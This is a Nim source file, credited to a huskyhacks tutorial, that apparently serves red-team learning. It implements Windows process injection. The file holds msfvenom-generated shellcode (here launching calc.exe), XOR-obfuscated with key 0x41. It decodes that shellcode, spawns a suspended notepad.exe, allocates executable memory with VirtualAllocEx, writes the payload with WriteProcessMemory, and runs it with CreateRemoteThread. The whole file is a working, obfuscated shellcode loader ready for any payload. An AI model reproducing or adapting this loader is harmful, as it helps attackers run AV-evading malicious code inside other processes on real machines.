#[
    Credit: https://huskyhacks.dev/2021/07/17/nim-exploit-dev/
    Process injection by huskyhacks
]#

import osproc
import strformat
import winim
import winim/lean

 # msfvenom -p windows/x64/exec CMD="C:\Windows\System32\Calc.exe" -f py
 # Then xored with 0x41
var buf: array[296, byte] = [
byte  0xbd, 0x09, 0xc2, 0xa5, 0xb1, 0xa9, 0x81, 0x41, 0x41, 0x41, 0x00, 0x10, 0x00,
0x11, 0x13, 0x10, 0x17, 0x09, 0x70, 0x93, 0x24, 0x09, 0xca, 0x13, 0x21, 0x09,
0xca, 0x13, 0x59, 0x09, 0xca, 0x13, 0x61, 0x09, 0xca, 0x33, 0x11, 0x09, 0x4e,
0xf6, 0x0b, 0x0b, 0x0c, 0x70, 0x88, 0x09, 0x70, 0x81, 0xed, 0x7d, 0x20, 0x3d,
0x43, 0x6d, 0x61, 0x00, 0x80, 0x88, 0x4c, 0x00, 0x40, 0x80, 0xa3, 0xac, 0x13,
0x00, 0x10, 0x09, 0xca, 0x13, 0x61, 0xca, 0x03, 0x7d, 0x09, 0x40, 0x91, 0xca,
0xc1, 0xc9, 0x41, 0x41, 0x41, 0x09, 0xc4, 0x81, 0x35, 0x26, 0x09, 0x40, 0x91,
0x11, 0xca, 0x09, 0x59, 0x05, 0xca, 0x01, 0x61, 0x08, 0x40, 0x91, 0xa2, 0x17,
0x09, 0xbe, 0x88, 0x00, 0xca, 0x75, 0xc9, 0x09, 0x40, 0x97, 0x0c, 0x70, 0x88,
0x09, 0x70, 0x81, 0xed, 0x00, 0x80, 0x88, 0x4c, 0x00, 0x40, 0x80, 0x79, 0xa1,
0x34, 0xb0, 0x0d, 0x42, 0x0d, 0x65, 0x49, 0x04, 0x78, 0x90, 0x34, 0x99, 0x19,
0x05, 0xca, 0x01, 0x65, 0x08, 0x40, 0x91, 0x27, 0x00, 0xca, 0x4d, 0x09, 0x05,
0xca, 0x01, 0x5d, 0x08, 0x40, 0x91, 0x00, 0xca, 0x45, 0xc9, 0x09, 0x40, 0x91,
0x00, 0x19, 0x00, 0x19, 0x1f, 0x18, 0x1b, 0x00, 0x19, 0x00, 0x18, 0x00, 0x1b,
0x09, 0xc2, 0xad, 0x61, 0x00, 0x13, 0xbe, 0xa1, 0x19, 0x00, 0x18, 0x1b, 0x09,
0xca, 0x53, 0xa8, 0x16, 0xbe, 0xbe, 0xbe, 0x1c, 0x09, 0xfb, 0x40, 0x41, 0x41,
0x41, 0x41, 0x41, 0x41, 0x41, 0x09, 0xcc, 0xcc, 0x40, 0x40, 0x41, 0x41, 0x00,
0xfb, 0x70, 0xca, 0x2e, 0xc6, 0xbe, 0x94, 0xfa, 0xb1, 0xf4, 0xe3, 0x17, 0x00,
0xfb, 0xe7, 0xd4, 0xfc, 0xdc, 0xbe, 0x94, 0x09, 0xc2, 0x85, 0x69, 0x7d, 0x47,
0x3d, 0x4b, 0xc1, 0xba, 0xa1, 0x34, 0x44, 0xfa, 0x06, 0x52, 0x33, 0x2e, 0x2b,
0x41, 0x18, 0x00, 0xc8, 0x9b, 0xbe, 0x94, 0x02, 0x7b, 0x1d, 0x16, 0x28, 0x2f,
0x25, 0x2e, 0x36, 0x32, 0x1d, 0x12, 0x38, 0x32, 0x35, 0x24, 0x2c, 0x72, 0x73,
0x1d, 0x02, 0x20, 0x2d, 0x22, 0x6f, 0x24, 0x39, 0x24, 0x41]

proc unXor[I,T](xoredBuf: array[I,T], key: byte): array[I, T] =
    var sc: array[xoredBuf.len, byte]
    for i in low(xoredBuf) .. high(xoredBuf):
        sc[i] = xoredBuf[i] xor key
    
    return sc

proc inject[I, T](shellcode: array[I, T]): void =
    let injectedProcess = startProcess("notepad.exe")
    injectedProcess.suspend()
    echo &"[+] Suspended Process: {injectedProcess.processID}"

    let procHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](injectedProcess.processID)
    )
    echo &"[+] Injected process handle: {procHandle}"

    let memPointer = VirtualAllocEx(
        procHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let writeProcess = WriteProcessMemory(
        procHandle,
        memPointer,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    echo &"[+] WriteProcessMemory: {bool(writeProcess)}"
    echo &"    Bytes written:      {bytesWritten}"

    let thHandle = CreateRemoteThread(
        procHandle,
        NULL, 
        0,
        cast[LPTHREAD_START_ROUTINE](memPointer),
        NULL, 
        0,
        NULL
    )

    echo &"[+] Thread Handle: {thHandle}"

when isMainModule:
    let key = 0x41
    let sc = unXor(buf, key.byte)
    inject(sc)